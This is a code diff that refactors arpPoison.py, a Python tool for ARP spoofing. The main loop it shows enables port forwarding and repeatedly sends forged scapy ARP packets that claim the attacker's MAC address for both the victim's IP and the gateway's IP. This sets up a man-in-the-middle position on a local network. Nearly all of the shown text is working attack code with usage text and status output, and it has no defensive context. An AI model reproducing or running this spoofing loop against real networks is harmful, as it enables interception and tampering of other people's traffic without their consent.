@@ -100,40 +100,39 @@ if __name__ == '__main__':
 		print('Usage: sudo python3 arpPoison.py <target_IP_address>')
 		print('*** sudo privileges required for modification of port forwarding')
 		exit(-1)
-	else:
-		victim_ip = sys.argv[1]
 
-		p = Popen(['ip', 'r'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
-		try:
-			gateway_ip = getDefaultGateway(p)
-		except:
-			print('No default gateway could be found')		# FIXME: print to stderr
-			exit(-1)
+	victim_ip = sys.argv[1]
 
-		attacker_mac = get_mac_address()	
+	p = Popen(['ip', 'r'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+	try:
+		gateway_ip = getDefaultGateway(p)
+	except:
+		print('No default gateway could be found')		# FIXME: print to stderr
+		exit(-1)
 
-		togglePortForwarding(1)	
-	
+	attacker_mac = get_mac_address()	
+
+	togglePortForwarding(1)	
+
+	print(colored('[*] Beginning ARP poison, Ctrl+c to quit', 'yellow'))
+	print(' -- GATEWAY: ', gateway_ip)
+	print(' -- VICTIM: ', victim_ip)
+
+	i = 0
+	while True:
+		i = i + 1
+
+		with contextlib.redirect_stdout(None):	
+			# Telling the victim 'I am the router'
+			vic_packet = scap.ARP(op=1, pdst=victim_ip, hwsrc=attacker_mac, psrc=gateway_ip)
+			scap.send(vic_packet)
+
+			# Telling the router 'I am the victim'
+			router_packet = scap.ARP(op=1, pdst=gateway_ip, hwsrc=attacker_mac, psrc=victim_ip)
+			scap.send(router_packet)
 		
-		print(colored('[*] Beginning ARP poison, Ctrl+c to quit', 'yellow'))
-		print(' -- GATEWAY: ', gateway_ip)
-		print(' -- VICTIM: ', victim_ip)
-
-		i = 0
-		while True:
-			i = i + 1
-
-			with contextlib.redirect_stdout(None):	
-				# Telling the victim 'I am the router'
-				vic_packet = scap.ARP(op=1, pdst=victim_ip, hwsrc=attacker_mac, psrc=gateway_ip)
-				scap.send(vic_packet)
-
-				# Telling the router 'I am the victim'
-				router_packet = scap.ARP(op=1, pdst=gateway_ip, hwsrc=attacker_mac, psrc=victim_ip)
-				scap.send(router_packet)
-			
-			if i % 25 == 0:
-				print('[+] Poisoning active')
-				print(' |')
-				print(' |--> Gateway: ', gateway_ip)
-				print(' |--> Victim: ', victim_ip)
+		if i % 25 == 0:
+			print('[+] Poisoning active')
+			print(' |')
+			print(' |--> Gateway: ', gateway_ip)
+			print(' |--> Victim: ', victim_ip)
